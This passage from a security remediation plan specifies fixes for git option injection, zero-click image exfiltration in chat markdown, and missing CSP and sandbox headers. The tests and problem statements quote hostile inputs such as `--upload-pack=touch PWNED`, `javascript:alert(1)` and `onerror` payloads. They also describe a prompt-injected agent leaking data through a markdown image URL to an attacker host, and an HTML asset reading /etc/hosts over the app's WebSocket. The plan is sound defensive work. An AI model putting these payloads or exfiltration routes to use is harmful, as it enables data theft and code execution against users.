     Import the validators from `@neokod/shared/git` (the file already imports from it at line 28).
  3. Call sites. Every one is listed; `SRC` says where the name comes from. Apply exactly these argument orders.
     - `createWorktree` (line 2329; SRC `vcs.createWorktree` RPC and Symphony): validate `refName`, `newRefName`, `baseRefName` with `validateGitRefName`. New argv: `["worktree", "add", "-b", newRefName, "--", worktreePath, refName]` and `["worktree", "add", "--", worktreePath, refName]` (verified: `git worktree add -b feat -- ../w1 main` works). The config call at line 2351 becomes `["config", "--", `branch.${input.newRefName}.gh-merge-base`, baseBranch]` (verified with a value of `-x`).
     - `removeWorktree` (line 2458, argv built at lines 2461 to 2465; SRC RPC): `args.push("--", input.path)` after the optional `--force`, giving `["worktree", "remove", "--force", "--", path]`. Update the expected argv at `GitVcsDriverCore.test.ts:204` accordingly.
     - `switchRef` (line 2618; SRC RPC, `BitbucketApi.ts:894`, `GitManager.ts:1850`): validate `input.refName` first. The `show-ref --verify` calls (lines 2623 to 2640) are safe because the name is prefixed with `refs/heads/` or `refs/remotes/`. Argv at lines 2677 to 2684 gets a trailing `--` on every form: `["checkout", refName, "--"]`, `["checkout", "--track", refName, "--"]`, `["checkout", localTrackingBranch, "--"]`. Do not use `--end-of-options` or a leading `--` for `checkout`: `git checkout -- <x>` means pathspec, and on git 2.55 `checkout --end-of-options -f` reports `pathspec '-f' did not match`. Verified that a trailing `--` keeps the remote-branch guess and `--track origin/x --` working and that it fixes a file and branch with the same name.
     - `createRef` (line 2700; SRC RPC, `GitManager.ts:1849`): validate, argv `["branch", "--", input.refName]` (verified: `git branch -- -x` reports an invalid branch name instead of parsing an option).
     - `renameBranch` (line 2597; SRC `ProviderCommandReactor`): already `["branch", "-m", "--", old, new]` (line 2608); add validation of `newBranch` and `oldBranch`.
     - `fetchPullRequestBranch` (line 2366; SRC PR flow, branch derived from a remote PR): validate `input.branch`; refspec starts with `+` so no argv change.
     - `fetchRemote` (line 2385): validate `remoteName`; argv `["fetch", "--quiet", "--", input.remoteName]`.
     - `fetchRemoteBranch` (line 2417) and `fetchRemoteTrackingBranch` (line 2439): validate `remoteName`, `remoteBranch`, `localBranch`; fetch argv `["fetch", "--quiet", "--no-tags", "--", remoteName, refspec]`; the materialize calls become `["branch", "--force", "--", localBranch, targetRef]` and `["branch", "--", localBranch, targetRef]`.
     - `setBranchUpstream` (line 2450): validate `branch`; argv `["branch", "--set-upstream-to", `${remote}/${branch}`, "--", input.branch]` (verified).
     - `ensureRemote` (line 1151; SRC provider URLs and `publishRepository` `remoteName`): the name is already sanitised by `sanitizeRemoteName` (line 260, strips leading `-`). Validate `input.url` with `validateGitArgumentValue(url, "Remote URL")` and use `["remote", "add", "--", remoteName, input.url]` (verified).
     - `pushCurrentBranch` (line 1678; the remote comes from `options.remoteName` or git config): validate `requestedRemoteName` when set; argv `["push", "-u", "--", remote, `HEAD:refs/heads/${branch}`]` at the three push calls (lines 1698, 1761, 1779; `git push -- r2 HEAD:refs/heads/zz` verified).
     - `fetchRemoteForStatus` (line 997): remote is git-derived; add `"--"` before `remoteName` only for consistency.
     - `computeAheadCountAgainstBase` (line 1237, argv line 1249), `readRangeContext` (line 1850; range at 1853, three argvs at 1858 to 1877) and `getReviewDiffPreview` (line 1933; argv at 1990 to 1996): SRC includes the `review.getDiffPreview` RPC `baseRef` and Symphony. Validate with `validateGitArgumentValue(baseRef, "Base ref")` (fail with `GitCommandError`), and put `"--end-of-options"` immediately before the range argument: `["rev-list", "--count", "--end-of-options", range]`, `["log", "--oneline", "--end-of-options", range]`, `["diff", "--stat", "--end-of-options", range]`, `["diff", "--no-ext-diff", "--patch", "--minimal", "--end-of-options", range]`, and in the review diff `[..., "--end-of-options", `${baseRef}...HEAD`]`. Do not use the ref-grammar validator here: callers may pass `origin/main`, `HEAD~3` or a sha.
     - Safe, no change: `branchExists` (line 941), `remoteBranchExists` (line 1080) and `resolveRemoteTrackingCommit` (line 2399) prefix the name with `refs/heads/` or `refs/remotes/`; `resolveCurrentUpstream`, `listRefs` and the status reads use names that git itself produced; `listRefs` `query` is filtered in JavaScript and never reaches git.
     - Outside the driver: `SourceControlRepositoryService.cloneRepository` (line 206): `const problem = validateGitArgumentValue(remoteUrl, "Clone URL")`; on a problem fail with `SourceControlRepositoryError({ operation: "cloneRepository", provider, detail: problem })` before calling git; argv `["clone", "--", remoteUrl, preparedDestination.directoryName]` (the directory name is `path.basename` of the user destination and can start with `-`). `symphony/Review/ModelReviewer.ts:192,197` become `["rev-parse", "--verify", "--end-of-options", `${ref}^{commit}`]`; `symphony/Evidence/Service.ts:156` becomes `["log", "--pretty=format:%H|%aI|%s", "--end-of-options", `${baseBranch}..HEAD`]` (the base branch comes from a repository-owned workflow file, so it is attacker influenced for a cloned repo).
  4. Minimum git version. The repository documents none. The driver already needs git 2.36 or newer for `git worktree list --porcelain -z` (`GitVcsDriverCore.ts:2522`, T3 issue 12761 reports older git fails there), and `--end-of-options` arrived in git 2.24, so it is safe for `rev-parse`, `rev-list`, `log` and `diff` with no version probe. Do not add `--end-of-options` to `checkout`, `branch`, `worktree`, `fetch`, `remote`, `push` or `clone`; for those the validator plus `--` is the defence, and both work on every git that supports the rest of the driver. Record this in a one-line comment above the validators.
- Do not:
  - Do not put `--` before the ref in `checkout`; it turns the ref into a pathspec.
  - Do not call `git check-ref-format` as a subprocess for validation (extra process per call, and `--branch` also accepts `@{-1}`); use the pure function.
  - Do not reject unicode or `/` in names, and do not apply the ref grammar to `baseRef` revisions or clone URLs.
  - Do not edit the `show-ref` calls that already prefix `refs/heads/`.
- Tests:
  - `packages/shared/src/git.test.ts` (extend; import `validateGitRefName`, `validateGitArgumentValue`): `validateGitRefName accepts ordinary names` (`main`, `feature/x`, `release-1.2`, `origin/main`, `neokod/abcd1234`, `é`, `feature/ünï`, `a@b`); `validateGitRefName rejects option-like and malformed names` (table: `-f`, `--upload-pack=x`, `-`, `a..b`, `a b`, tab inside, `a~1`, `a^`, `a:b`, `a?`, `a*`, `a[`, `a\\b`, `a@{b`, `@`, `a.lock`, `a/.hidden`, `a/`, `/a`, `a//b`, `a.`, empty, 256 characters, `\u0000`, `\u007f`; assert each returns a non-null string and the first returns a message containing `'-'`); `validateGitArgumentValue allows revisions and urls` (`origin/main`, `HEAD~3`, `https://x/y.git`) and rejects `--output=/tmp/x` and an embedded newline.
  - `apps/server/src/vcs/GitVcsDriverCore.test.ts` (reuse `makeTmpDir`, `initRepoWithCommit`, `git`, `writeTextFile`, `GitVcsDriver.GitVcsDriver`; inside the worktree `describe` near line 753 or a new `describe("argument safety")`):
    - `switchRef rejects option-like names and keeps local changes`: write a modified `README.md`; for each of `-f`, `--upload-pack=x`, `a..b`, `a b`: `Effect.flip(driver.switchRef({ cwd, refName }))` gives a `GitCommandError` whose `detail` is the validator message; afterwards `git(cwd, ["status", "--porcelain"])` equals ` M README.md`. Must FAIL on base (`-f` resets the file).
    - `switchRef and createRef accept slash and unicode names`: `createRef({ cwd, refName: "feature/ünï", switchRef: true })`, switch to the initial branch, switch back; assert `git(cwd, ["branch", "--show-current"])`.
    - `createRef rejects -f without creating a branch`: assert `git(cwd, ["branch", "--list"])` unchanged.
    - `createWorktree rejects option-like names and creates nothing`: `refName: "--detach"` and `newRefName: "-b"`; directory not created.
    - `createWorktree and removeWorktree accept a destination that starts with a dash`: `path` = `<tmp>/-wt`, `newRefName: "feature/dash-path"`; succeeds, `git(path, ["branch", "--show-current"])` is `feature/dash-path`, then `removeWorktree` removes it. Must FAIL on base (git parses `-wt` as an option).
    - `readRangeContext does not treat baseRef as an option`: `driver.readRangeContext(cwd, `--output=${tmp}/pwn`)` fails; `fileSystem.exists(`${tmp}/pwn..HEAD`)` is false. Must FAIL on base (the file is created).
    - Update the expected array at line 204 to `["worktree", "remove", "--force", "--", worktreePath]`.
  - `apps/server/src/sourceControl/SourceControlRepositoryService.test.ts`: change line 182 to `args: ["clone", "--", CLONE_URLS.url, "neokod"]`; new test `rejects a clone URL that starts with a dash` using the same `makeLayer` (reuse the `cloneCalls` recording git stub): `remoteUrl: "--upload-pack=touch PWNED"`; assert the flipped error `operation === "cloneRepository"` and `cloneCalls` is empty. Must FAIL on base.
- Verify: from `packages/shared` `PATH=<node24>:$PATH pnpm exec vp test run src/git.test.ts`; from `apps/server` `pnpm exec vp test run src/vcs/GitVcsDriverCore.test.ts` and `pnpm exec vp test run src/sourceControl/SourceControlRepositoryService.test.ts` and `pnpm exec vp test run src/git/GitManager.test.ts src/symphony` (existing suites must stay green); `pnpm exec tsgo --noEmit` in `packages/shared` and `apps/server`; `vp check` and `vp run typecheck` at the root.
- Depends on: apply after X-9 (both edit `removeWorktree` argv; this card updates the test at line 204). Effort: M. Commit message: `fix(git): validate ref names and terminate options in every git invocation`

### X-12 Chat markdown: block automatic remote image loads and remove the Google favicon request (FA-06, CP-05)

- Problem: `ChatMarkdown` renders markdown images with the default `<img>` (there is no `img` entry in `markdownComponents`, `apps/web/src/components/ChatMarkdown.tsx:1329`), and the sanitize schema (`CHAT_MARKDOWN_SANITIZE_SCHEMA`, lines 154 to 165) extends `defaultSchema`, whose `img` `src` protocols are `http` and `https` (`hast-util-sanitize@5.0.2/lib/schema.js` lines 43 and 145). A prompt-injected agent can therefore send data to any host with `![](https://evil/?d=...)` and zero clicks. Every external link also loads `https://www.google.com/s2/favicons?domain=<host>` (`MarkdownLinkFavicon`, lines 826 to 846), leaking each link host to Google.
- Files to change:
  - `apps/web/src/markdown-links.ts` : add `classifyMarkdownImageSource` (file exports start at line 47).
  - `apps/web/src/components/ChatMarkdown.tsx` : add `MarkdownImage` and an `img` entry in `markdownComponents` (line 1329); simplify `MarkdownLinkFavicon` (line 826), delete `failedFaviconHosts` (line 813); drop the now unused `host` prop from `MarkdownLinkFavicon` and `MarkdownExternalLinkContent` (lines 944 to 990, call at line 1428); export `CHAT_MARKDOWN_SANITIZE_SCHEMA`.
  - `apps/web/src/index.css` : style for the placeholder next to `.chat-markdown .chat-markdown-link-favicon` (line 798).
  - Tests: `apps/web/src/markdown-links.test.ts` (extend), `apps/web/src/components/ChatMarkdown.test.tsx` (new), `apps/web/src/components/ChatMarkdown.browser.tsx` (new).
- Change:
  1. `markdown-links.ts`: add

     ```ts
     export type MarkdownImageSource =
       | { readonly kind: "local"; readonly src: string }
       | { readonly kind: "remote"; readonly url: string; readonly host: string }
       | { readonly kind: "blocked" };

     export function classifyMarkdownImageSource(
       src: string | undefined,
       context: { readonly baseUrl: string; readonly trustedOrigins: ReadonlySet<string> },
     ): MarkdownImageSource;
     ```

     Rules: empty or undefined gives `blocked`. Resolve with `new URL(src, context.baseUrl)` (catch errors, return `blocked`); this applies the same parsing the browser uses, so `//evil.com/x.png` and `/\evil.com/x.png` resolve to `evil.com` and are classified `remote`. Then switch on `url.protocol`: `"http:"` or `"https:"` gives `local` (return `src` unchanged) when `context.trustedOrigins.has(url.origin)`, otherwise `remote` with `url: url.href` and `host: url.host`; `"data:"` gives `local` only when `/^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/i.test(src)` (SVG data URLs stay blocked); every other protocol gives `blocked`. (Sanitisation already strips `data:` image sources today, so this branch only matters if the schema is later widened; keep it so the rule lives in one place.)

  2. `ChatMarkdown.tsx`, new component above `MarkdownLinkFavicon`:
     ```tsx
     export const MarkdownImage = memo(function MarkdownImage({
       src,
       alt,
       baseUrl,
       trustedOrigins,
     }: {
       src: string | undefined;
       alt: string | undefined;
       baseUrl: string;
       trustedOrigins: ReadonlySet<string>;
     }) {
       const [loaded, setLoaded] = useState(false);
       const source = classifyMarkdownImageSource(src, { baseUrl, trustedOrigins });
       if (source.kind === "blocked") return alt ? <span>{alt}</span> : null;
       if (source.kind === "local" || loaded) {
         return (
           <img
             src={source.kind === "local" ? source.src : source.url}
             alt={alt ?? ""}
             loading="lazy"
             decoding="async"
             referrerPolicy="no-referrer"
             draggable={false}
           />
         );
       }
       return (
         <span className="chat-markdown-remote-image">
           <GlobeIcon aria-hidden className="size-3.5 shrink-0" />
           <a href={source.url} target="_blank" rel="noopener noreferrer">
             {alt || source.host}
           </a>
           <span className="chat-markdown-remote-image-host">{source.host}</span>
           <Button type="button" variant="outline" size="xs" onClick={() => setLoaded(true)}>
             Load image
           </Button>
         </span>
       );
     });
     ```
     State is per component instance, so each image needs its own click and a remount (list virtualisation) asks again. Never render `source.url` into an `<img>` before the click.
  3. In `markdownComponents` add, next to `p` (line 1331) and `li`: `img({ node: _node, src, alt }) { return <MarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} baseUrl={markdownImageBaseUrl} trustedOrigins={trustedImageOrigins} />; }`. Inside `ChatMarkdown` (before `markdownComponents`, after `preparedConnection` at line 1248):
     ```ts
     const markdownImageBaseUrl =
       typeof window !== "undefined" && window.location
         ? window.location.href
         : "http://localhost/";
     const environmentHttpBaseUrl =
       preparedConnection._tag === "Some" ? preparedConnection.value.httpBaseUrl : null;
     const trustedImageOrigins = useMemo(() => {
       const origins = new Set<string>();
       try {
         origins.add(new URL(markdownImageBaseUrl).origin);
       } catch {
         /* keep empty */
       }
       if (environmentHttpBaseUrl) {
         try {
           origins.add(new URL(environmentHttpBaseUrl).origin);
         } catch {
           /* ignore */
         }
       }
       return origins;
     }, [markdownImageBaseUrl, environmentHttpBaseUrl]);
     ```
     Add `markdownImageBaseUrl` and `trustedImageOrigins` to the `useMemo` dependency list (the list that starts at line 1522, `resolvedTheme` is at line 1531). `preparedConnection` is an `Option` (see `preparedConnection._tag === "None"` at line 1308); `httpBaseUrl` is already used at line 1322. Attachment and asset URLs come from the connected environment (`/api/assets/<token>/<name>`, `apps/server/src/http.ts:146`), so they are same-origin with the page or with `httpBaseUrl` and stay `local`.
  4. Favicon: replace the body of `MarkdownLinkFavicon` with
     ```tsx
     const MarkdownLinkFavicon = memo(function MarkdownLinkFavicon() {
       return (
         <span className="chat-markdown-link-favicon" aria-hidden>
           <GlobeIcon className={MARKDOWN_LINK_FAVICON_CLASS_NAME} />
         </span>
       );
     });
     ```
     Delete `failedFaviconHosts` (line 813) and its comment (line 812). Remove `host` from `MarkdownExternalLinkContent`'s props and from its three `<MarkdownLinkFavicon host={host} />` uses (lines 958, 974, 986) and from the call at line 1428. `resolveExternalLinkHost` (line 815) and `faviconHost` (line 1377) stay: they still decide which links get the globe and tooltip. `useState` stays imported (used by `MarkdownImage` and others).
  5. Export the schema: `export const CHAT_MARKDOWN_SANITIZE_SCHEMA` (line 154). Do not change its contents.
  6. CSS (`index.css`, after the favicon rule at line 804):
     ```css
     .chat-markdown .chat-markdown-remote-image {
       @apply inline-flex max-w-full flex-wrap items-center gap-x-2 gap-y-1 rounded-md border border-border px-2 py-1 align-middle text-sm;
     }
     .chat-markdown .chat-markdown-remote-image-host {
       color: var(--text-secondary);
     }
     ```
  7. Interaction with X-13: the CSP `img-src` there must keep `https:` and `http:` so the user-initiated load works. If the owner prefers a strict `img-src 'self' data: blob:`, drop the Load button (see Open questions).

- Do not:
  - Do not loosen or edit `CHAT_MARKDOWN_SANITIZE_SCHEMA`; the gate is at render, sanitisation stays the first line of defence.
  - Do not use `new URL(src)` without a base or a regex on the raw string; relative and protocol-relative forms must go through the same resolution as the browser.
  - Do not add a server-side favicon fetcher or proxy; the generic globe is the whole change. Leave `apps/web/src/lib/favicon.ts` and `RightPanelTabs.tsx` (browser preview tab) alone (Open questions).
  - Do not prefetch or `<link rel=preload>` the remote URL, and do not persist "loaded" state.
- Tests:
  - `apps/web/src/markdown-links.test.ts` (extend, it already imports from `./markdown-links`): `classifyMarkdownImageSource` table with `baseUrl "https://app.example/t/1"` and `trustedOrigins new Set(["https://app.example", "http://127.0.0.1:3773"])`: `/api/assets/abc.def/x.png` is `local`; `https://app.example/a.png` is `local`; `http://127.0.0.1:3773/api/assets/t/x.png` is `local`; `https://evil.example/leak?q=1` is `remote` with `host "evil.example"`; `//evil.example/x.png` is `remote`; `/\evil.example/x.png` is `remote`; `http://127.0.0.1:9999/pixel` is `remote` (different port); `data:image/png;base64,AAAA` is `local`; `data:image/svg+xml;base64,AAAA` and `javascript:alert(1)` and `file:///etc/passwd` and ``are`blocked`.
  - `apps/web/src/components/ChatMarkdown.test.tsx` (new, `vite-plus/test`, `renderToStaticMarkup` from `react-dom/server`, import `ReactMarkdown`, `rehypeRaw`, `rehypeSanitize`): `MarkdownImage renders a remote image as a link with a Load image button` (props `src "https://evil.example/leak?q=1"`, `alt "chart"`, `baseUrl "https://app.example/"`, `trustedOrigins new Set(["https://app.example"])`; assert markup contains `Load image`, contains `evil.example`, and does not contain `<img`); `MarkdownImage renders a trusted asset as an img with no-referrer` (assert `<img`, `referrerpolicy="no-referrer"`); `sanitize schema keeps event handlers and scripts out and leaves the image to the component` (render `<ReactMarkdown rehypePlugins={[rehypeRaw, [rehypeSanitize, CHAT_MARKDOWN_SANITIZE_SCHEMA]]} components={{ img: (p) => <MarkdownImage src={p.src as string} alt={p.alt} baseUrl="https://app.example/" trustedOrigins={new Set(["https://app.example"])} /> }}>` with text `![x](https://evil.example/a.png)\n\n<img src="https://evil.example/b.png" onerror="alert(1)">\n\n<script>alert(1)</script>`; assert markup has no `onerror`, no `<script`, no `<img` and two `Load image` buttons). `external link renders no third-party favicon` (render the full default `ChatMarkdown` with text `[x](https://secret-internal.corp.example/p)`; reuse the `beforeAll` stubs from `components/chat/MessagesTimeline.test.tsx` lines 133 to 165 for `window`, `document` and `localStorage`; assert markup does not contain `google.com` or `favicons` and does contain `chat-markdown-link-favicon`). All four must FAIL on base (an `<img src="https://evil.example/...">` and a google.com favicon are emitted).
  - `apps/web/src/components/ChatMarkdown.browser.tsx` (new; pattern from `SubagentsPanel.browser.tsx`: `import "~/index.css"`, `renderBrowserHarness` from `../test/browser/render`, `page` from `vite-plus/test/browser/context`). Test `does not request remote images or Google favicons until the user clicks Load image`: render `<ChatMarkdown text={"![leak](https://leak.invalid/pixel.png?d=SECRET)\n\n[doc](https://secret-internal.corp.example/path)"} cwd={undefined} />`; if the component throws for a missing atom registry, wrap it in `AppAtomRegistryProvider` from `../rpc/atomRegistry`. Assert (a) `document.querySelectorAll("img")` contains no element whose `src` includes `leak.invalid` or `google.com` or `gstatic.com`; (b) `await expect.element(page.getByRole("button", { name: "Load image" })).toBeVisible()`; (c) after a 300 ms wait, `performance.getEntriesByType("resource").map((e) => e.name)` has no entry containing `leak.invalid`, `google.com` or `gstatic.com`; (d) click `Load image` and assert one `img` with `src` containing `leak.invalid` now exists (the request is now user-initiated; the load fails, which is fine). Fails on base at (a).
- Verify: from `apps/web` `PATH=<node24>:$PATH pnpm exec vp test run src/markdown-links.test.ts src/components/ChatMarkdown.test.tsx src/components/chat/MessagesTimeline.test.tsx`; browser lane (needs Chromium once: `pnpm run test:browser:install`) `pnpm exec vp test run --project browser src/components/ChatMarkdown.browser.tsx`; `pnpm exec tsgo --noEmit` in `apps/web`; `vp check` and `vp run typecheck` at the root. Manual: run the app, paste an assistant message containing `![x](https://example.com/a.png)` and a link; DevTools Network shows no request to `example.com` or `google.com` until `Load image` is clicked.
- Depends on: none (coordinate with X-13). Effort: M. Commit message: `fix(web): block automatic remote images and drop third-party favicons in chat markdown`

### X-13 Security headers: app-shell CSP, nosniff and Referrer-Policy on static files, sandboxed attachment-only asset responses (FA-05, CP-04)

- Problem: `GET /` and every static file are sent with no `Content-Security-Policy`, `X-Frame-Options`, `Referrer-Policy` or `X-Content-Type-Options` (`staticAndDevRouteLayer`, `apps/server/src/http.ts:248-251` and `260-263` pass only `status` and `contentType`). The asset route sets only `Cache-Control` and nosniff (`http.ts:167-172`) and serves `.html`, `.svg` and `.pdf` inline from the app origin, so a script in a workspace HTML file runs with the origin that owns `/ws`. Proven in rt-d: an HTML asset opened top-level ran `new WebSocket('ws://'+location.host+'/ws')` and read `/etc/hosts` through `projects.readFile`.
- Files to change:
  - `apps/server/src/http.ts` : add and export `assetResponseHeaders`, `appShellContentSecurityPolicy`, `inlineScriptHashes`, `appShellHeaders`, `staticFileHeaders`; use them in `assetRouteLayer` (line 144, headers at lines 169 to 172) and `staticAndDevRouteLayer` (line 179, responses at lines 248 to 251 and 260 to 263).
  - `apps/server/src/http.test.ts` : unit tests (the file currently has one `describe("http dev routing")`, 25 lines).
  - `apps/server/src/server.test.ts` : HTTP-level tests inside `it.layer(NodeServices.layer)("server router seam", ...)` (opens at line 870).
- Change:
  1. Add `import { createHash } from "node:crypto";` at the top of `http.ts` (other server files already import node built-ins).
  2. Asset headers, one exported pure function (reference: T3 `apps/server/src/http.ts:89-133` `assetResponseHeaders`, but T3 keeps `allow-scripts` for HTML, which is the bug; do not copy that):

     ```ts
     const ASSET_BASE_HEADERS = {
       "Cache-Control": "private, max-age=3600",
       "X-Content-Type-Options": "nosniff",
       "Referrer-Policy": "no-referrer",
     } as const;

     export function assetResponseHeaders(filePath: string): Record<string, string> {
       const dot = filePath.lastIndexOf(".");
       const extension = dot < 0 ? "" : filePath.slice(dot).toLowerCase();
       if (extension === ".pdf") return { ...ASSET_BASE_HEADERS };
       if (extension === ".html" || extension === ".htm") {
         return {
           ...ASSET_BASE_HEADERS,
           "Content-Security-Policy": "sandbox",
           "Content-Disposition": "attachment",
         };
       }
       if (extension === ".svg") {
         return {
           ...ASSET_BASE_HEADERS,
           "Content-Security-Policy": "default-src 'none'; sandbox",
           "Content-Disposition": "attachment",
         };
       }
       return { ...ASSET_BASE_HEADERS, "Content-Security-Policy": "default-src 'none'; sandbox" };
     }
     ```

     Why each value. `sandbox` with no `allow-*` token gives the document an opaque origin and disables scripts, forms, popups and top navigation. `Content-Disposition: attachment` turns a top-level navigation to the URL into a download, and does not stop `<img src>` from rendering the image (the web client builds asset URLs in `useAssetUrl`, `apps/web/src/assets/assetUrls.ts:10`; confirm in the browser check below that SVG and PNG thumbnails still render). `.pdf` gets no CSP because Chromium's built-in PDF viewer does not load under a `sandbox` CSP; a PDF cannot script the origin. Everything else (css, js, fonts, raster images, attachments) gets `default-src 'none'; sandbox` so a top-level visit renders nothing active. Use the real file path (`asset.path`), not the URL, for the extension, as the route already does for the content type.

  3. In `assetRouteLayer` replace the `headers` object at lines 169 to 172 with `headers: assetResponseHeaders(asset.path)`. Keep `status: 200`.
  4. App-shell CSP. Add:

     ```ts
     export function inlineScriptHashes(html: string): ReadonlyArray<string> {
       const hashes: Array<string> = [];
       for (const match of html.matchAll(/<script(?![^>]*\ssrc\s*=)[^>]*>([\s\S]*?)<\/script>/gi)) {
         const source = match[1] ?? "";
         if (source.trim().length === 0) continue;
         hashes.push(`'sha256-${createHash("sha256").update(source, "utf8").digest("base64")}'`);
       }
       return hashes;
     }

     export function appShellContentSecurityPolicy(scriptHashes: ReadonlyArray<string>): string {
       return [
         "default-src 'self'",
         ["script-src 'self' 'wasm-unsafe-eval'", ...scriptHashes].join(" "),
         "style-src 'self' 'unsafe-inline'",
         "img-src 'self' data: blob: https: http:",
         "font-src 'self' data:",
         "connect-src 'self' ws: wss: https: http:",
         "worker-src 'self' blob:",
         "manifest-src 'self'",
         "object-src 'none'",
         "base-uri 'self'",
         "form-action 'self'",
         "frame-ancestors 'none'",
       ].join("; ");
     }
     ```

     Directive reasons, each checked against `apps/web/index.html` and the build in `apps/web/dist` (a local, git-ignored build from 4 October):
     - `script-src`: `index.html` has exactly one inline classic script (the theme bootstrap, lines 14 to 42) and the built page adds `<script type="module" crossorigin src="/assets/index-*.js">`. The inline script is allowed by hash (computed from the served HTML, so editing it never breaks the policy), no `'unsafe-inline'`. `'wasm-unsafe-eval'` is required because the main bundle and `worker-*.js` call `WebAssembly.instantiate` (the syntax highlighter). The bundles contain no `eval(` and no `new Function(` (checked with grep on `index-*.js`, `worker-*.js`, `wasm-*.js`), so `'unsafe-eval'` must not be added.
     - `style-src 'unsafe-inline'`: required by the inline `<style>` in `index.html` and by React `style=` attributes. Not hashable.
     - `font-src 'self' data:`: the CSS references `/assets/jetbrains-mono-*.woff2` and has six `data:font/woff` URLs.
     - `worker-src 'self' blob:`: `DiffWorkerPoolProvider.tsx:2` imports `@pierre/diffs/worker/worker.js?worker`, built as `new Worker("/assets/worker-*.js")`. `blob:` is kept as a margin; remove it later if nothing needs it.
     - `img-src ... https: http:`: composer previews use `blob:` (`ChatComposer.tsx:1953`), CSS has a `data:image/svg+xml`, the favicon and remote-machine asset URLs are cross-origin, and X-12 requires user-initiated remote images to load. If the owner later picks strict images (Open questions), change to `'self' data: blob:` plus remote machine origins.
     - `connect-src` is scheme-wide on purpose. B2 (`docs/plan-cards/03-access-token-and-machines.md:355`) stores remote machines in the browser at runtime, so the server that serves the shell cannot list them, and a Tailscale `http://100.x.y.z` machine cannot be expressed as a host source. The protection against exfiltration comes from `script-src` (no injected or remote script can run), not from `connect-src`. `'self'` is listed explicitly for Safari versions that do not match `ws:` to `'self'`.
     - `frame-ancestors 'none'` plus `X-Frame-Options: DENY` stop clickjacking of the UI. The desktop `<webview>` (`apps/web/src/browser/HostedBrowserWebview.tsx:203`) is a guest, not a frame of the shell, and the desktop wraps the server in its own protocol with its own CSP that replaces this header (`apps/desktop/src/electron/ElectronProtocol.ts:78-118`, `headers.set`), so this header does not affect the desktop app.

  5. Static headers:

     ```ts
     const STATIC_BASE_HEADERS = {
       "X-Content-Type-Options": "nosniff",
       "Referrer-Policy": "no-referrer",
     } as const;

     export const appShellHeaders = (html: string): Record<string, string> => ({
       ...STATIC_BASE_HEADERS,
       "Content-Security-Policy": appShellContentSecurityPolicy(inlineScriptHashes(html)),
       "X-Frame-Options": "DENY",
     });
     ```

     In `staticAndDevRouteLayer`:
     - SPA fallback (lines 245 to 251): `const html = new TextDecoder().decode(indexData);` then add `headers: appShellHeaders(html)` to the options.
     - Normal file (lines 254 to 263): if `contentType.startsWith("text/html")` decode `data` and use `appShellHeaders(...)`, otherwise `STATIC_BASE_HEADERS`. Worker and module scripts under `/assets` get nosniff only, on purpose: a CSP on a worker script response would replace the document policy for that worker and could break `WebAssembly` there.
     - The 302 redirect to `devUrl` (line 192), the 400, 404, 500 and 503 text responses stay as they are. In dev the Vite server owns headers.

  6. CORS is unchanged. `access-control-allow-origin: *` on the shell (rt-d FA-05) is a separate decision owned by the access-token cards; do not change `browserApiCorsLayer`.

- Do not:
  - Do not put `'unsafe-inline'` or `'unsafe-eval'` in `script-src`, and do not add `allow-scripts` or `allow-same-origin` to any asset CSP. If scripted HTML previews are wanted they need their own origin (Open questions).
  - Do not apply the app-shell CSP to `/api/assets/*`, to `/assets/*.js` or to JSON responses; do not set it on the dev redirect.
  - Do not sandbox PDFs and do not add `Content-Disposition` to PDFs or raster images.
  - Do not read the CSP value from the desktop file; the two policies differ on purpose (the desktop one pins loopback origins).
- Tests:
  - `apps/server/src/http.test.ts` (extend; it imports from `./http.ts` and uses `vite-plus/test`; add imports `createHash` from `node:crypto` and `readFileSync` from `node:fs`). New `describe("security headers", ...)`:
    - `assetResponseHeaders sandboxes html without scripts and forces download`: for `"/w/report.html"` and `"/w/REPORT.HTM"` assert `["Content-Security-Policy"]` is exactly `"sandbox"`, `["Content-Disposition"]` is `"attachment"`, `["X-Content-Type-Options"]` is `"nosniff"`, `["Referrer-Policy"]` is `"no-referrer"`, and the CSP string does not contain `allow-`.
    - `assetResponseHeaders locks down svg, leaves pdf viewable`: `.svg` gives CSP `"default-src 'none'; sandbox"` and `attachment`; `.pdf` has no `Content-Security-Policy` and no `Content-Disposition`; `.png` and `.js` give the `default-src 'none'; sandbox` CSP and no `Content-Disposition`.
    - `inlineScriptHashes hashes only inline scripts`: html `'<script>window.a=1</script><script type="module" crossorigin src="/assets/x.js"></script><script src = "/b.js"></script><script> </script>'` returns exactly `[`'sha256-${createHash("sha256").update("window.a=1").digest("base64")}'`]`.
    - `appShellContentSecurityPolicy has no unsafe script sources`: `const csp = appShellContentSecurityPolicy(["'sha256-abc'"]);` assert it contains `"script-src 'self' 'wasm-unsafe-eval' 'sha256-abc'"`, `"frame-ancestors 'none'"`, `"object-src 'none'"`, `"base-uri 'self'"`; assert `csp` does not contain `unsafe-eval'` outside of `wasm-unsafe-eval` (use `expect(csp.replace("'wasm-unsafe-eval'", "")).not.toContain("unsafe-eval")`) and that the `script-src` directive (`csp.split("; ").find((d) => d.startsWith("script-src"))`) does not contain `unsafe-inline`.
    - `shipped index.html is CSP compatible`: `const html = readFileSync(new URL("../../web/index.html", import.meta.url), "utf8");` assert `inlineScriptHashes(html)` has length 1, and `html` does not match `/\son[a-z]+\s*=/i` outside the script body (strip `<script>...</script>` first) and does not contain `javascript:`. This fails the day someone adds an inline handler.
    - These tests pass or fail independently of the base only through new exports, so they "fail" on base by import error; that is expected for pure-function cards. The HTTP tests below fail on base on header values.
  - `apps/server/src/server.test.ts` (extend; reuse `buildAppUnderTest`, `getHttpServerUrl` and `fetchEffect` as in the test at line 873; imports needed: `createHash` from `node:crypto`, `issueAssetUrl` from `./assets/AssetAccess.ts`, `ThreadId` is already imported at line 25; `ProjectFaviconResolver`, `WorkspacePaths`, `ServerSecretStore` and `ServerConfig` are already imported at lines 88 to 97 area):
    - `sends CSP, nosniff, frame and referrer headers on the app shell`: write `staticDir/index.html` = `<html><head><script>window.__shell=1</script></head><body>shell</body></html>` and `staticDir/app.js` = `export {};`; `buildAppUnderTest({ config: { staticDir } })`. `GET /` : status 200, `headers["content-security-policy"]` contains `` `'sha256-${createHash("sha256").update("window.__shell=1").digest("base64")}'` `` and `"frame-ancestors 'none'"`, `headers["x-frame-options"] === "DENY"`, `headers["x-content-type-options"] === "nosniff"`, `headers["referrer-policy"] === "no-referrer"`. `GET /some/spa/route` has the same CSP. `GET /app.js` has `x-content-type-options === "nosniff"` and `headers["content-security-policy"] === undefined`.
